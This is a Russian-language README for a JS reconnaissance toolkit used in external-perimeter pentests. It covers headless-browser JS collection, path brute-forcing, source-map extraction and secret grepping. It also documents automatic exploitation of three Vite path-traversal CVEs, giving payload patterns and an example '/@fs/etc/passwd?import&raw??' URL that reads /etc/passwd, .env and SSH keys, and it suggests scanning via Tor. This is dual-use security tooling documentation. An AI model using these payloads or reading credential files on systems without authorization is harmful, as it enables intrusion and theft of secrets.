# ai-js_recon

Инструментарий для автоматизированного JS recon и анализа при пентесте внешних периметров.

Состоит из трёх компонентов:
- `ai-jsrecon.py` — сбор JS файлов через headless Chromium, брутфорс, source maps, Next.js/Vite детект
- `grepper.py` — статический анализ JS на секреты, API эндпоинты, чувствительные пути
- `jsrecon` — bash-обёртка для запуска из любого каталога

---

## Установка

```bash
cd /opt/my-tools/ai-js_recon
python3 -m venv venv
source venv/bin/activate
pip install playwright httpx jsbeautifier
playwright install chromium

# Установить глобальную команду
sudo cp jsrecon /usr/local/bin/jsrecon
sudo chmod +x /usr/local/bin/jsrecon
```

---

## Быстрый старт

```bash
# Полный прогон: сбор + анализ
jsrecon full targets.txt -d --json

# Только сбор
jsrecon scan targets.txt -d

# Только анализ скачанных файлов
jsrecon grep --severity secrets --json
```

---

## ai-jsrecon.py

### Что делает

1. **Сбор JS** — открывает каждый домен в headless Chromium, перехватывает все `.js` запросы + парсит `<script src>` теги
2. **Брутфорс** — пробует имена из вордлиста в найденных директориях; baseline запрос защищает от soft-404
3. **Скачивание** — сохраняет JS файлы локально для дальнейшего анализа
4. **Source maps** — ищет `.map` файлы тремя способами: `sourceMappingURL`, HTTP заголовок `SourceMap:`, прямой перебор `{file}.map`; извлекает исходники
5. **Next.js** — извлекает `buildId`, парсит `_buildManifest.js`, пробует `/_next/data/` эндпоинты
6. **Vite** — детектирует dev/prod сборку, проверяет CVE-2025-30208 / CVE-2025-31125 / CVE-2025-31486, читает sensitive файлы через LFI

### Аргументы

| Флаг | По умолчанию | Описание |
|------|-------------|----------|
| `-f, --file` | — | Файл со списком доменов (по одному на строку) |
| `-u, --url` | — | Один домен для сканирования |
| `-w, --wordlist` | встроенный | Кастомный вордлист для брутфорса (без расширения) |
| `-t, --timeout` | 20 | Таймаут загрузки страницы в секундах |
| `-c, --concurrency` | 3 | Параллельных доменов одновременно |
| `-o, --output` | `./output` | Директория вывода |
| `-d, --download` | false | Скачивать найденные JS файлы |
| `-v, --verbose` | false | Выводить каждый найденный JS URL |
| `-H, --header` | — | Кастомный заголовок (повторяемый) |
| `--proxy` | — | Прокси для брутфорса (напр. `socks5://127.0.0.1:9050`) |
| `--brute-concurrency` | 20 | Параллельных запросов при брутфорсе |
| `--brute-delay` | 0 | Задержка между запросами брутфорса (сек) |

### Структура вывода

```
output/
  target.com/
    js_files.txt          ← найденные JS URLs (только целевой домен)
    bruteforced.txt       ← найденные брутом JS URLs
    js/                   ← скачанные JS файлы
    sourcemaps/           ← скачанные .map файлы
    sources/              ← восстановленный исходный код
    next_info.json        ← Next.js: buildId, роуты, data endpoints
    next_data/            ← ответы /_next/data/ эндпоинтов
    vite_info.json        ← Vite: CVE результаты, payload, sep
    vite_lfi/             ← файлы прочитанные через LFI
```

### Примеры

```bash
# Базовый скан
python3 ai-jsrecon.py -f subdomains.txt

# С загрузкой и вордлистом
python3 ai-jsrecon.py -f subdomains.txt -d -w wordlist.txt

# Через Tor (медленно но анонимно)
python3 ai-jsrecon.py -f subdomains.txt -d \
  --proxy socks5://127.0.0.1:9050 \
  --brute-concurrency 3 \
  --brute-delay 1.5 \
  -c 2

# С кастомными заголовками (авторизация)
python3 ai-jsrecon.py -f subdomains.txt -d \
  -H "Cookie: session=abc123" \
  -H "Authorization: Bearer token"
```

---

## grepper.py

### Что ищет

**Секреты:** AWS ключи, Google API, Firebase, Slack, GitHub/GitLab токены, JWT, Stripe, Telegram, Sentry DSN, MongoDB/PostgreSQL/Redis URI, SSH ключи, пароли, Vite `/@fs/` LFI, `VITE_*` переменные окружения

**API эндпоинты:** Swagger/OpenAPI, GraphQL, REST v1/v2/v3, WebSocket URL, внешние API вызовы

**Чувствительные пути:** admin, debug, health, config, upload, CI/CD, Kubernetes, Bitrix, Vite dev пути, PHP обработчики

### Аргументы

| Флаг | По умолчанию | Описание |
|------|-------------|----------|
| `-o, --output` | `./output` | Директория с JS данными |
| `-t, --target` | — | Произвольный путь для сканирования (повторяемый) |
| `-d, --domain` | — | Фильтр по домену (substring match) |
| `-j, --jobs` | 4 | Параллельных воркеров |
| `--json` | false | Сохранить JSON отчёт |
| `--save-txt` | false | Сохранить текстовый отчёт |
| `--severity` | `all` | `secrets` — только секреты; `all` — всё |
| `--no-color` | false | Отключить цвета |

### Примеры

```bash
# Стандартный анализ
python3 grepper.py -o output/

# Только секреты + JSON
python3 grepper.py --severity secrets --json

# Анализ файлов из waymore/другого инструмента
python3 grepper.py -t ~/.config/waymore/results/target.com/jsfiles/

# Конкретный домен
python3 grepper.py -d api.target.com --json --save-txt

# Много воркеров для большого объёма
python3 grepper.py -j 16 --json
```

### Структура отчёта

`js_analysis_report.json` содержит:
- `secrets` — найденные секреты с контекстом, номером строки, файлом
- `apis` — API эндпоинты
- `sensitive` — чувствительные пути
- `vite` — результаты Vite CVE проверок с payload деталями и содержимым прочитанных файлов

---

## jsrecon (bash wrapper)

```bash
jsrecon scan targets.txt [options]    # только сбор
jsrecon grep [options]                # только анализ
jsrecon full targets.txt [options]    # сбор + анализ
```

Все флаги `ai-jsrecon.py` и `grepper.py` поддерживаются напрямую.

```bash
# Полный прогон с прокси и JSON отчётом
jsrecon full targets.txt \
  -d \
  -w wordlist.txt \
  -c 5 \
  --proxy http://127.0.0.1:9090 \
  --json \
  --save-txt \
  -o /path/to/output
```

---

## Vite CVE

При обнаружении dev сервера (`/@vite/client` в JS URLs) автоматически проверяются:

| CVE | Метод | Маркер успеха |
|-----|-------|---------------|
| CVE-2025-30208 | Path traversal через `?import&raw??` | `export default` |
| CVE-2025-31125 | WebAssembly bypass `?import&?inline=1.wasm?init` | `data:application/octet-stream;base64` |
| CVE-2025-31486 | Server-FS bypass через фиктивный путь | `export default` |

При подтверждении CVE скрипт читает sensitive файлы (`/etc/passwd`, `/.env`, `vite.config.ts`, SSH ключи и др.) и сохраняет в `vite_lfi/`.

Результаты в `vite_info.json`:
```json
{
  "root_path": "/",
  "base_url": "https://target.com",
  "confirmed": {
    "CVE-2025-30208": {
      "payload": "https://target.com/@fs/etc/passwd?import&raw??",
      "sep": "/@fs",
      "response_marker": "export default",
      "root_path": "/"
    }
  },
  "lfi_files": ["/etc/passwd", "/.env"]
}
```

---

## Зависимости

```
playwright
httpx
jsbeautifier (опционально, для prettier минифицированного JS)
```